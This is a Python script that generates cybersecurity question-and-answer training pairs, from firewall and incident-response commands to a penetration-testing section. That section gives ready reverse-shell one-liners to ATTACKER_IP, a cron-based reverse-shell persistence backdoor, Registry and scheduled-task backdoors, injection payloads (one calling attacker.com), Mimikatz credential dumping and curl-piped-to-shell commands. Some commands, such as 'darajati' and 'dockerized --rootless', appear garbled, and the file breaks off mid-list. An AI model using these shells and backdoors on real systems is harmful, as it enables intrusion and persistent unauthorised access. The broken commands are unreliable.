"""
Download and generate network security operations and cybersecurity training data.
Covers: network security, penetration testing, incident response, system hardening,
cryptography, malware analysis, and security best practices.
"""
import json
import os
from typing import List, Tuple
from pathlib import Path

CACHE_DIR = Path("cache/datasets")
CACHE_DIR.mkdir(parents=True, exist_ok=True)


def generate_network_security_ops() -> List[Tuple[str, str]]:
    """Generate network security operations training data."""
    pairs = [
        # Firewall operations
        ("How do I list iptables rules?", "```bash\nsudo iptables -L -n -v\n# Or for saved rules:\nsudo iptables-save\n```"),
        ("How do I block an IP with iptables?", "```bash\nsudo iptables -A INPUT -s 192.168.1.100 -j DROP\n# To persist:\nsudo iptables-save > /etc/iptables/rules.v4\n```"),
        ("How do I allow port 443 in iptables?", "```bash\nsudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT\nsudo iptables -A OUTPUT -p tcp --sport 443 -j ACCEPT\n```"),
        ("How do I configure ufw firewall?", "```bash\nsudo ufw enable\nsudo ufw allow 22/tcp\nsudo ufw allow 80/tcp\nsudo ufw allow 443/tcp\nsudo ufw status verbose\n```"),
        ("How do I set up nftables?", "```bash\nsudo nft add table inet filter\nsudo nft add chain inet filter input { type filter hook input priority 0 \\; }\nsudo nft add rule inet filter input tcp dport 22 accept\nsudo nft add rule inet filter input drop\n```"),

        # Network scanning
        ("How do I scan a network with nmap?", "```bash\n# Basic scan\nnmap -sV 192.168.1.0/24\n# Aggressive scan\nnmap -A -T4 192.168.1.1\n# Stealth scan\nnmap -sS -sV -O 192.168.1.1\n```"),
        ("How do I detect open ports?", "```bash\n# Using nmap\nnmap -sT -p 1-65535 target.com\n# Using netcat\nnc -zv target.com 1-1000\n# Using ss locally\nss -tuln\n```"),
        ("How do I scan for vulnerabilities?", "```bash\n# Nmap vulnerability scripts\nnmap --script vuln 192.168.1.1\n# OpenVAS scan\nopenvas-start && gvm-cli socket --xml '<get_tasks/>'\n```"),
        ("How do I perform a ping sweep?", "```bash\n# Using nmap\nnmap -sn 192.168.1.0/24\n# Using fping\nfping -a -g 192.168.1.0/24\n```"),

        # Packet capture and analysis
        ("How do I capture packets with tcpdump?", "```bash\n# Capture all traffic\nsudo tcpdump -i eth0 -w capture.pcap\n# Filter by port\nsudo tcpdump -i eth0 port 80 -w http.pcap\n# Filter by host\nsudo tcpdump -i eth0 host 192.168.1.100\n```"),
        ("How do I analyze pcap files?", "```bash\n# Using tcpdump\ntcpdump -r capture.pcap\n# Using tshark\ntshark -r capture.pcap -Y 'http.request'\n# Extract HTTP requests\ntshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri\n```"),
        ("How do I use Wireshark filters?", "Display filters:\n- ip.addr == 192.168.1.1\n- tcp.port == 443\n- http.request.method == \"POST\"\n- dns.qry.name contains \"example\"\n- tcp.flags.syn == 1 && tcp.flags.ack == 0\n- frame.time >= \"2024-01-01\""),
        ("How do I detect network anomalies?", "```bash\n# Monitor connections\nnetstat -ant | awk '{print $6}' | sort | uniq -c\n# Check for unusual ports\nss -tuln | grep -v '22\\|80\\|443'\n# Monitor bandwidth\niftop -i eth0\n# Check DNS queries\ntcpdump -i eth0 port 53 -n\n```"),

        # IDS/IPS
        ("How do I configure Snort IDS?", "```bash\n# Edit snort.conf\nvim /etc/snort/snort.conf\n# Set HOME_NET\nipvar HOME_NET 192.168.1.0/24\n# Run Snort\nsnort -A console -q -c /etc/snort/snort.conf -i eth0\n```"),
        ("How do I write Snort rules?", "```\n# Alert on SSH brute force\nalert tcp any any -> $HOME_NET 22 (msg:\"SSH Brute Force\"; flow:to_server; threshold:type both, track by_src, count 5, seconds 60; sid:1000001;)\n# Detect SQL injection\nalert tcp any any -> $HOME_NET 80 (msg:\"SQL Injection\"; content:\"' OR '\"; nocase; sid:1000002;)\n```"),
        ("How do I set up Suricata?", "```bash\n# Install\nsudo apt install suricata\n# Configure\nvim /etc/suricata/suricata.yaml\n# Update rules\nsuricata-update\n# Run\nsuricata -c /etc/suricata/suricata.yaml -i eth0\n```"),

        # VPN and encryption
        ("How do I set up OpenVPN?", "```bash\n# Install\nsudo apt install openvpn easy-rsa\n# Generate certs\nmake-cadir ~/openvpn-ca && cd ~/openvpn-ca\n./easyrsa init-pki\n./easyrsa build-ca\n./easyrsa gen-req server nopass\n./easyrsa sign-req server server\n```"),
        ("How do I configure WireGuard VPN?", "```bash\n# Generate keys\nwg genkey | tee privatekey | wg pubkey > publickey\n# Configure /etc/wireguard/wg0.conf\n[Interface]\nPrivateKey = <server_private_key>\nAddress = 10.0.0.1/24\nListenPort = 51820\n[Peer]\nPublicKey = <client_public_key>\nAllowedIPs = 10.0.0.2/32\n# Start\nwg-quick up wg0\n```"),
        ("How do I set up SSH tunneling?", "```bash\n# Local port forwarding\nssh -L 8080:localhost:80 user@remote\n# Remote port forwarding\nssh -R 9090:localhost:22 user@remote\n# Dynamic SOCKS proxy\nssh -D 1080 user@remote\n# ProxyJump\nssh -J jumphost user@target\n```"),

        # Network monitoring
        ("How do I monitor network traffic?", "```bash\n# Real-time bandwidth\niftop -i eth0\n# Connection statistics\nnetstat -s\n# Watch connections\nwatch -n1 'ss -s'\n# Traffic by process\nnethogs eth0\n```"),
        ("How do I detect ARP spoofing?", "```bash\n# Static ARP entries\narp -s 192.168.1.1 00:11:22:33:44:55\n# Monitor ARP table\nwatch -n1 'arp -a'\n# Using arpwatch\narpwatch -i eth0\n# Detect with tcpdump\ntcpdump -i eth0 arp\n```"),
        ("How do I set up network logging?", "```bash\n# Enable connection tracking\niptables -A INPUT -j LOG --log-prefix \"INPUT: \" --log-level 4\n# Configure rsyslog\necho 'kern.warning /var/log/iptables.log' >> /etc/rsyslog.conf\n# Rotate logs\nlogrotate /etc/logrotate.d/iptables\n```"),

        # DNS security
        ("How do I configure DNSSEC?", "```bash\n# Generate keys\ndnssec-keygen -a RSASHA256 -b 2048 -n ZONE example.com\ndnssec-keygen -a RSASHA256 -b 4096 -n ZONE -f KSK example.com\n# Sign zone\ndnssec-signzone -o example.com -k Kexample.com.+008+12345 db.example.com\n```"),
        ("How do I detect DNS tunneling?", "```bash\n# Monitor DNS query lengths\ntcpdump -i eth0 port 53 | awk '{print length}' | sort -n | uniq -c\n# Check for TXT records\ntshark -i eth0 -Y 'dns.qry.type == 16' -T fields -e dns.qry.name\n# Analyze with zeek\nzeek -r capture.pcap local\ncat dns.log\n```"),
        ("How do I set up DNS over HTTPS?", "```bash\n# Using cloudflared\ncloudflared proxy-dns --port 5053 --upstream https://1.1.1.1/dns-query\n# Configure systemd-resolved\nDNSOverTLS=yes\nDNS=1.1.1.1#cloudflare-dns.com\n```"),

        # SSL/TLS
        ("How do I check SSL certificate?", "```bash\n# Check remote cert\nopenssl s_client -connect example.com:443 -servername example.com\n# Show cert details\nopenssl s_client -connect example.com:443 | openssl x509 -noout -text\n# Check expiry\necho | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates\n```"),
        ("How do I generate SSL certificates?", "```bash\n# Self-signed\nopenssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key.pem -out cert.pem\n# CSR for CA signing\nopenssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr\n# Let's Encrypt\ncertbot --nginx -d example.com\n```"),
        ("How do I test SSL configuration?", "```bash\n# Using testssl.sh\ntestssl.sh https://example.com\n# Using nmap\nnmap --script ssl-enum-ciphers -p 443 example.com\n# Check for vulnerabilities\nsslscan example.com:443\n```"),
    ]
    return pairs


def generate_penetration_testing() -> List[Tuple[str, str]]:
    """Generate penetration testing training data."""
    pairs = [
        # Reconnaissance
        ("How do I perform OSINT?", "```bash\n# DNS enumeration\ndig +short example.com\nwhois example.com\n# Subdomain discovery\nsubfinder -d example.com\namass enum -d example.com\n# Email harvesting\ntheHarvester -d example.com -b google\n```"),
        ("How do I enumerate subdomains?", "```bash\n# Using subfinder\nsubfinder -d example.com -o subdomains.txt\n# Using amass\namass enum -passive -d example.com\n# DNS brute force\ngobuster dns -d example.com -w wordlist.txt\n# Certificate transparency\ncurl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value'\n```"),
        ("How do I gather information about a target?", "```bash\n# Web technologies\nwhatweb example.com\nwappalyzer example.com\n# Directory enumeration\ngobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt\n# CMS detection\nwpscan --url https://example.com\n```"),

        # Web application testing
        ("How do I test for SQL injection?", "```bash\n# Using sqlmap\nsqlmap -u 'http://target.com/page?id=1' --dbs\nsqlmap -u 'http://target.com/page?id=1' -D database --tables\nsqlmap -u 'http://target.com/page?id=1' --forms --crawl=2\n# Manual test payloads\n' OR '1'='1\n' UNION SELECT NULL,NULL--\n```"),
        ("How do I test for XSS?", "Test payloads:\n```html\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>\n\"><script>alert('XSS')</script>\n```\nTools:\n```bash\nxsser -u 'http://target.com/?q=test'\ndarajati -u 'http://target.com/?q=FUZZ' -w xss-payloads.txt\n```"),
        ("How do I test for SSRF?", "Test URLs:\n```\nhttp://127.0.0.1:80\nhttp://localhost:22\nhttp://[::1]:80\nhttp://169.254.169.254/latest/meta-data/\nhttp://0.0.0.0:80\nfile:///etc/passwd\n```"),
        ("How do I test for command injection?", "Payloads:\n```\n; ls -la\n| cat /etc/passwd\n`whoami`\n$(id)\n& ping -c 3 attacker.com &\n```\n\nUse:\n```bash\ncommix -u 'http://target.com/page?cmd=test'\n```"),
        ("How do I test for directory traversal?", "Payloads:\n```\n../../../etc/passwd\n....//....//....//etc/passwd\n..%2f..%2f..%2fetc/passwd\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd\n..\\..\\..\\windows\\system32\\config\\sam\n```"),

        # Exploitation frameworks
        ("How do I use Metasploit?", "```bash\nmsfconsole\nmsf> search type:exploit platform:linux\nmsf> use exploit/multi/handler\nmsf> set payload linux/x64/meterpreter/reverse_tcp\nmsf> set LHOST 192.168.1.100\nmsf> set LPORT 4444\nmsf> exploit\n```"),
        ("How do I create a reverse shell?", "```bash\n# Bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n# Python\npython -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n# Netcat\nnc -e /bin/bash ATTACKER_IP 4444\n```"),
        ("How do I set up a listener?", "```bash\n# Netcat\nnc -lvnp 4444\n# Metasploit\nmsfconsole -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit'\n# socat\nsocat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash\n```"),

        # Password attacks
        ("How do I crack passwords?", "```bash\n# John the Ripper\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --show hashes.txt\n# Hashcat\nhashcat -m 0 hashes.txt rockyou.txt  # MD5\nhashcat -m 1000 hashes.txt rockyou.txt  # NTLM\nhashcat -m 1800 hashes.txt rockyou.txt  # sha512crypt\n```"),
        ("How do I perform brute force attacks?", "```bash\n# Hydra\nhydra -l admin -P passwords.txt ssh://192.168.1.1\nhydra -L users.txt -P passwords.txt http-post-form://target.com/login:user=^USER^&pass=^PASS^:F=incorrect\n# Medusa\nmedusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh\n```"),
        ("How do I extract password hashes?", "```bash\n# Linux\nsudo cat /etc/shadow\nunshadow /etc/passwd /etc/shadow > hashes.txt\n# Windows (Mimikatz)\nmimikatz# sekurlsa::logonpasswords\nmimikatz# lsadump::sam\n# From memory dump\nvolatility -f memory.dmp --profile=Win10 hashdump\n```"),

        # Privilege escalation
        ("How do I escalate privileges on Linux?", "```bash\n# Check sudo permissions\nsudo -l\n# Find SUID binaries\nfind / -perm -4000 2>/dev/null\n# Check writable /etc/passwd\nls -la /etc/passwd\n# Kernel exploits\nuname -r && searchsploit linux kernel\n# LinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n```"),
        ("How do I escalate privileges on Windows?", "```powershell\n# Check current privileges\nwhoami /priv\n# Find unquoted service paths\nwmic service get name,pathname | findstr /i /v \"C:\\Windows\"\n# Check AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# WinPEAS\n.\\winpeas.exe\n```"),

        # Post-exploitation
        ("How do I maintain persistence?", "Linux:\n```bash\n# Cron job\necho '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' | crontab -\n# SSH key\necho 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys\n# Systemd service\ncp backdoor.service /etc/systemd/system/\n```\n\nWindows:\n```powershell\n# Registry Run key\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\backdoor.exe\"\n# Scheduled task\nschtasks /create /tn \"Updater\" /tr \"C:\\backdoor.exe\" /sc onlogon\n```"),
        ("How do I pivot through networks?", "```bash\n# SSH tunnel\nssh -L 8080:internal-host:80 user@pivot-host\n# chisel\n# Server on attacker:\nchisel server -p 8080 --reverse\n# Client on pivot:\nchisel client ATTACKER:8080 R:socks\n# proxychains\nproxychains nmap -sT 10.10.10.0/24\n```"),
    ]
    return pairs


def generate_incident_response() -> List[Tuple[str, str]]:
    """Generate incident response training data."""
    pairs = [
        # Detection and analysis
        ("How do I detect a compromised system?", "Check for indicators:\n```bash\n# Unusual processes\nps aux | grep -v \"\\[\" | awk '{print $11}' | sort | uniq -c | sort -rn\n# Network connections\nnetstat -antup | grep ESTABLISHED\n# Modified files\nfind / -mtime -1 -type f 2>/dev/null\n# Failed logins\ngrep 'Failed password' /var/log/auth.log\n# Rootkits\nrkhunter --check\nchkrootkit\n```"),
        ("How do I analyze malware?", "```bash\n# Static analysis\nfile suspicious_file\nstrings suspicious_file\nobjdump -d suspicious_file\n# Hash lookup\nsha256sum suspicious_file\n# Upload to VirusTotal\ncurl --request POST --url 'https://www.virustotal.com/api/v3/files' --header 'x-apikey: API_KEY' --form file=@suspicious_file\n# Dynamic analysis in sandbox\nVBox/VMware snapshot\nProcess Monitor, ProcDOT\nWireshark for network\n```"),
        ("How do I perform memory forensics?", "```bash\n# Capture memory (Linux)\nsudo dd if=/dev/mem of=memory.dump bs=1M\nsudo insmod lime.ko 'path=/tmp/mem.lime format=lime'\n# Analysis with Volatility\nvolatility -f memory.dump imageinfo\nvolatility -f memory.dump --profile=LinuxProfile linux_pslist\nvolatility -f memory.dump --profile=Win10x64 psscan\nvolatility -f memory.dump --profile=Win10x64 netscan\nvolatility -f memory.dump --profile=Win10x64 malfind\n```"),
        ("How do I analyze logs for intrusion?", "```bash\n# Authentication failures\ngrep -i 'failed\\|invalid\\|error' /var/log/auth.log\n# Web server attacks\ngrep -E '(union.*select|<script>|\\.\\./)' /var/log/apache2/access.log\n# Unusual commands\ncat ~/.bash_history | grep -E '(wget|curl|nc|bash -i)'\n# Timeline\nfind / -type f -printf '%T@ %p\\n' 2>/dev/null | sort -n | tail -100\n```"),

        # Containment
        ("How do I isolate a compromised system?", "```bash\n# Network isolation\niptables -P INPUT DROP\niptables -P OUTPUT DROP\niptables -P FORWARD DROP\n# Allow only incident response\niptables -A INPUT -s IR_WORKSTATION_IP -j ACCEPT\niptables -A OUTPUT -d IR_WORKSTATION_IP -j ACCEPT\n# Disable network interface (last resort)\nifconfig eth0 down\n```"),
        ("How do I block a malicious IP?", "```bash\n# iptables\niptables -A INPUT -s MALICIOUS_IP -j DROP\niptables -A OUTPUT -d MALICIOUS_IP -j DROP\n# firewalld\nfirewall-cmd --permanent --add-rich-rule='rule family=ipv4 source address=MALICIOUS_IP reject'\n# fail2ban\nfail2ban-client set sshd banip MALICIOUS_IP\n```"),
        ("How do I preserve evidence?", "```bash\n# Create forensic image\ndd if=/dev/sda of=/mnt/forensics/disk.img bs=4M conv=noerror,sync status=progress\n# Calculate hash\nsha256sum /dev/sda > /mnt/forensics/disk.sha256\n# Capture memory\nsudo insmod lime.ko 'path=/mnt/forensics/memory.lime format=lime'\n# Collect logs\ntar czf /mnt/forensics/logs.tar.gz /var/log/\n# Timeline\nfls -r -m / /dev/sda1 > /mnt/forensics/timeline.txt\n```"),

        # Remediation
        ("How do I remove malware from Linux?", "```bash\n# Kill malicious processes\nkill -9 $(pgrep -f malware_name)\n# Remove persistence\ncrontab -r\nrm -f /etc/cron.d/malicious\nsystemctl disable malicious.service\n# Remove files\nfind / -name 'malware*' -delete\n# Restore from backup\nrsync -av /backup/etc/ /etc/\n# Verify\nrkhunter --check\n```"),
        ("How do I recover from ransomware?", "1. Isolate infected systems\n2. Identify ransomware variant:\n   - Check ransom note\n   - Upload sample to ID Ransomware\n3. Check for decryption tools:\n   - No More Ransom project\n   - Vendor-specific tools\n4. Restore from backup:\n```bash\n# Verify backup integrity\ntar -tzf backup.tar.gz\n# Restore\ntar -xzf backup.tar.gz -C /restore/\n```\n5. Rebuild if needed\n6. Change all credentials"),

        # Reporting
        ("How do I document a security incident?", "Incident report structure:\n1. Executive Summary\n2. Timeline of events\n3. Attack vectors identified\n4. Systems affected\n5. Data compromised\n6. Containment actions taken\n7. Eradication steps\n8. Recovery process\n9. Lessons learned\n10. Recommendations\n\nEvidence:\n- Screenshots with timestamps\n- Log excerpts\n- Network captures\n- Hashes of artifacts"),
    ]
    return pairs


def generate_system_hardening() -> List[Tuple[str, str]]:
    """Generate system hardening training data."""
    pairs = [
        # Linux hardening
        ("How do I harden SSH?", "Edit /etc/ssh/sshd_config:\n```\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes\nMaxAuthTries 3\nClientAliveInterval 300\nClientAliveCountMax 2\nAllowUsers specificuser\nProtocol 2\nX11Forwarding no\nAllowTcpForwarding no\n```\nRestart: `systemctl restart sshd`"),
        ("How do I harden a Linux server?", "```bash\n# Update system\napt update && apt upgrade -y\n# Disable unnecessary services\nsystemctl list-unit-files --type=service | grep enabled\nsystemctl disable cups bluetooth avahi-daemon\n# Configure firewall\nufw enable && ufw default deny incoming\n# Set file permissions\nchmod 700 /root\nchmod 600 /etc/shadow\n# Enable audit logging\napt install auditd && systemctl enable auditd\n# Install security tools\napt install fail2ban rkhunter clamav\n```"),
        ("How do I set up fail2ban?", "```bash\napt install fail2ban\ncp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local\nvim /etc/fail2ban/jail.local\n```\n\nConfiguration:\n```ini\n[DEFAULT]\nbantime = 1h\nfindtime = 10m\nmaxretry = 5\n\n[sshd]\nenabled = true\nport = ssh\nlogpath = /var/log/auth.log\nmaxretry = 3\n```\n\n```bash\nsystemctl enable fail2ban\nsystemctl start fail2ban\nfail2ban-client status sshd\n```"),
        ("How do I configure SELinux?", "```bash\n# Check status\ngetenforce\nsestatus\n# Set enforcing\nsetenforce 1\nvim /etc/selinux/config  # SELINUX=enforcing\n# Troubleshoot\naudit2why < /var/log/audit/audit.log\n# Create custom policy\naudit2allow -a -M mypolicy\nsemodule -i mypolicy.pp\n# File contexts\nrestorecon -Rv /var/www/html\n```"),
        ("How do I set up AppArmor?", "```bash\napt install apparmor-utils\n# Check status\naa-status\n# Set profile to enforce mode\naa-enforce /etc/apparmor.d/usr.bin.program\n# Generate profile\naa-genprof /path/to/program\n# Log complaints\naa-logprof\n```"),
        ("How do I secure GRUB bootloader?", "```bash\n# Set password\ngrub-mkpasswd-pbkdf2\n# Edit /etc/grub.d/40_custom\nset superusers=\"root\"\npassword_pbkdf2 root grub.pbkdf2.sha512.10000...\n# Update\nupdate-grub\nchmod 600 /boot/grub/grub.cfg\n```"),

        # Windows hardening
        ("How do I harden Windows Server?", "```powershell\n# Disable SMBv1\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n# Enable firewall\nSet-NetFirewallProfile -Profile Domain,Public,Private -Enabled True\n# Audit policy\nauditpol /set /subcategory:\"Logon\" /success:enable /failure:enable\n# Disable guest account\nnet user guest /active:no\n# Password policy\nnet accounts /minpwlen:14 /maxpwage:90 /minpwage:1 /uniquepw:24\n```"),
        ("How do I configure Windows Defender?", "```powershell\n# Update definitions\nUpdate-MpSignature\n# Enable real-time protection\nSet-MpPreference -DisableRealtimeMonitoring $false\n# Enable cloud protection\nSet-MpPreference -MAPSReporting Advanced\n# Scan\nStart-MpScan -ScanType FullScan\n# Exclusions\nAdd-MpPreference -ExclusionPath 'C:\\Legit\\Path'\n```"),
        ("How do I enable BitLocker?", "```powershell\n# Check TPM\nGet-Tpm\n# Enable on C:\nEnable-BitLocker -MountPoint \"C:\" -EncryptionMethod Aes256 -TpmProtector\n# Add recovery password\nAdd-BitLockerKeyProtector -MountPoint \"C:\" -RecoveryPasswordProtector\n# Backup to AD\nBackup-BitLockerKeyProtector -MountPoint \"C:\" -KeyProtectorId $_.KeyProtectorId\n# Status\nGet-BitLockerVolume\n```"),

        # Container security
        ("How do I secure Docker?", "```bash\n# Run as non-root\nUSER 1000:1000 in Dockerfile\n# Read-only filesystem\ndocker run --read-only --tmpfs /tmp image\n# Limit resources\ndocker run --memory=512m --cpus=1 image\n# No new privileges\ndocker run --security-opt=no-new-privileges image\n# Scan images\ntrivy image myimage:latest\n# Use rootless mode\ndockerized --rootless\n```"),
        ("How do I secure Kubernetes?", "```yaml\n# Pod Security Policy\napiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: restricted\nspec:\n  privileged: false\n  runAsUser:\n    rule: MustRunAsNonRoot\n  seLinux:\n    rule: RunAsAny\n  fsGroup:\n    rule: RunAsAny\n  volumes:\n  - 'configMap'\n  - 'secret'\n```\n\n```bash\n# RBAC\nkubectl create clusterrolebinding admin --clusterrole=cluster-admin --user=admin\n# Network policies\nkubectl apply -f network-policy.yaml\n# Audit\nkube-bench run --targets=master,node\n```"),
    ]
    return pairs


def generate_cryptography() -> List[Tuple[str, str]]:
    """Generate cryptography training data."""
    pairs = [
        # Encryption basics
        ("What is symmetric encryption?", "Symmetric encryption uses the same key for encryption and decryption.\n\nExamples:\n- AES (Advanced Encryption Standard) - 128/192/256 bit keys\n- ChaCha20 - Stream cipher, faster on mobile\n- 3DES - Legacy, being phased out\n\n```python\nfrom cryptography.fernet import Fernet\nkey = Fernet.generate_key()\nf = Fernet(key)\nencrypted = f.encrypt(b'secret message')\ndecrypted = f.decrypt(encrypted)\n```"),
        ("What is asymmetric encryption?", "Asymmetric encryption uses a key pair: public key encrypts, private key decrypts.\n\nExamples:\n- RSA - Most common, 2048+ bits recommended\n- ECDSA - Elliptic curve, smaller keys\n- Ed25519 - Modern, fast, secure\n\n```python\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npublic_key = private_key.public_key()\n```"),
        ("What is hashing?", "Hashing produces a fixed-size output from any input. One-way, deterministic.\n\nAlgorithms:\n- SHA-256/SHA-3: Secure for general use\n- bcrypt/scrypt/Argon2: For passwords (include salt, slow)\n- MD5/SHA-1: Broken, avoid for security\n\n```python\nimport hashlib\nhash_obj = hashlib.sha256(b'data')\nprint(hash_obj.hexdigest())\n```"),

        # Practical cryptography
        ("How do I encrypt a file with GPG?", "```bash\n# Symmetric encryption\ngpg -c --cipher-algo AES256 file.txt\n# Decrypt\ngpg -d file.txt.gpg > file.txt\n# Asymmetric encryption\ngpg --encrypt --recipient user@email.com file.txt\n# Sign and encrypt\ngpg --sign --encrypt --recipient user@email.com file.txt\n# Verify signature\ngpg --verify file.txt.gpg\n```"),
        ("How do I use OpenSSL for encryption?", "```bash\n# Encrypt file\nopenssl enc -aes-256-cbc -salt -pbkdf2 -in file.txt -out file.enc\n# Decrypt\nopenssl enc -d -aes-256-cbc -pbkdf2 -in file.enc -out file.txt\n# Generate random key\nopenssl rand -hex 32\n# Hash file\nopenssl dgst -sha256 file.txt\n# RSA encrypt\nopenssl rsautl -encrypt -pubin -inkey public.pem -in file.txt -out file.enc\n```"),
        ("How do I generate secure keys?", "```python\nimport secrets\nimport os\n# Random bytes\nkey = secrets.token_bytes(32)  # 256 bits\n# Random hex string\ntoken = secrets.token_hex(32)\n# URL-safe token\ntoken = secrets.token_urlsafe(32)\n# System random\nkey = os.urandom(32)\n```\n\n```bash\n# OpenSSL\nopenssl rand -base64 32\n# /dev/urandom\nhead -c 32 /dev/urandom | base64\n```"),
        ("How do I hash passwords securely?", "```python\nimport bcrypt\n# Hash password\npassword = b'secretpassword'\nsalt = bcrypt.gensalt(rounds=12)\nhashed = bcrypt.hashpw(password, salt)\n# Verify\nif bcrypt.checkpw(password, hashed):\n    print('Password matches')\n```\n\n```python\n# Using Argon2 (recommended)\nfrom argon2 import PasswordHasher\nph = PasswordHasher()\nhash = ph.hash('password')\nph.verify(hash, 'password')\n```"),

        # TLS/PKI
        ("How do I create a certificate chain?", "```bash\n# Root CA\nopenssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 3650 -out rootCA.crt\n# Intermediate CA\nopenssl genrsa -out intermediate.key 4096\nopenssl req -new -key intermediate.key -out intermediate.csr\nopenssl x509 -req -in intermediate.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out intermediate.crt -days 1825\n# Server cert\nopenssl genrsa -out server.key 2048\nopenssl req -new -key server.key -out server.csr\nopenssl x509 -req -in server.csr -CA intermediate.crt -CAkey intermediate.key -CAcreateserial -out server.crt -days 365\n```"),
        ("What is perfect forward secrecy?", "Perfect Forward Secrecy (PFS) ensures that session keys cannot be compromised even if the server's private key is later compromised.\n\nImplementation:\n- Use ECDHE or DHE key exchange\n- Generate ephemeral keys per session\n\nTLS cipher suites with PFS:\n- TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\n- TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256\n\nNginx config:\n```\nssl_protocols TLSv1.2 TLSv1.3;\nssl_prefer_server_ciphers on;\nssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';\n```"),
    ]
    return pairs


def generate_security_best_practices() -> List[Tuple[str, str]]:
    """Generate security best practices training data."""
    pairs = [
        # Secure coding
        ("How do I prevent SQL injection?", "Use parameterized queries:\n```python\n# Bad - vulnerable\ncursor.execute(f\"SELECT * FROM users WHERE id = {user_id}\")\n# Good - parameterized\ncursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n# ORM (SQLAlchemy)\nUser.query.filter_by(id=user_id).first()\n```\n\n```javascript\n// Node.js with prepared statements\ndb.query('SELECT * FROM users WHERE id = ?', [userId]);\n```"),
        ("How do I prevent XSS attacks?", "1. Output encoding:\n```python\nfrom markupsafe import escape\nhtml = f'<p>{escape(user_input)}</p>'\n```\n\n2. Content Security Policy:\n```\nContent-Security-Policy: default-src 'self'; script-src 'self'\n```\n\n3. HTTPOnly cookies:\n```python\nresponse.set_cookie('session', value, httponly=True, secure=True)\n```\n\n4. Use frameworks that auto-escape (React, Vue, Django templates)"),
        ("How do I secure an API?", "1. Authentication:\n```python\n# JWT validation\nimport jwt\ndef verify_token(token):\n    return jwt.decode(token, SECRET_KEY, algorithms=['HS256'])\n```\n\n2. Rate limiting:\n```python\nfrom flask_limiter import Limiter\nlimiter = Limiter(app, default_limits=['100 per minute'])\n```\n\n3. Input validation\n4. HTTPS only\n5. CORS configuration\n6. API versioning\n7. Audit logging"),
        ("How do I store secrets securely?", "```bash\n# Environment variables\nexport API_KEY='secret'\n# Vault\nvault kv put secret/api key=secret\n# AWS Secrets Manager\naws secretsmanager create-secret --name MySecret --secret-string 'password'\n```\n\nNever:\n- Hardcode in source\n- Commit to git\n- Log secrets\n\nDo:\n- Rotate regularly\n- Use least privilege\n- Encrypt at rest"),

        # Authentication
        ("How do I implement secure authentication?", "1. Password requirements:\n   - Minimum 12 characters\n   - Check against breached password lists\n   - Use Argon2id for hashing\n\n2. Multi-factor authentication:\n```python\nimport pyotp\ntotp = pyotp.TOTP(secret)\nif totp.verify(user_code):\n    # Valid 2FA code\n```\n\n3. Session management:\n   - Regenerate session ID on login\n   - Set secure cookie flags\n   - Implement timeout"),
        ("How do I implement OAuth 2.0?", "```python\n# Using authlib\nfrom authlib.integrations.flask_client import OAuth\noauth = OAuth(app)\noauth.register(\n    name='github',\n    client_id='...',\n    client_secret='...',\n    authorize_url='https://github.com/login/oauth/authorize',\n    access_token_url='https://github.com/login/oauth/access_token',\n)\n\n@app.route('/login')\ndef login():\n    return oauth.github.authorize_redirect(url_for('callback', _external=True))\n\n@app.route('/callback')\ndef callback():\n    token = oauth.github.authorize_access_token()\n    user = oauth.github.get('user').json()\n```"),

        # Security architecture
        ("What is defense in depth?", "Defense in depth layers multiple security controls:\n\n1. Physical: Data center security, locks\n2. Network: Firewalls, IDS/IPS, segmentation\n3. Host: OS hardening, antivirus, EDR\n4. Application: Input validation, WAF\n5. Data: Encryption, access controls\n6. User: Training, MFA, least privilege\n\nEach layer provides protection if others fail. No single point of failure."),
        ("What is zero trust security?", "Zero Trust principles:\n1. Never trust, always verify\n2. Assume breach\n3. Verify explicitly\n4. Least privilege access\n5. Micro-segmentation\n\nImplementation:\n- Strong identity verification (MFA)\n- Device health checks\n- Network segmentation\n- Encrypted communications\n- Continuous monitoring\n- Just-in-time access"),
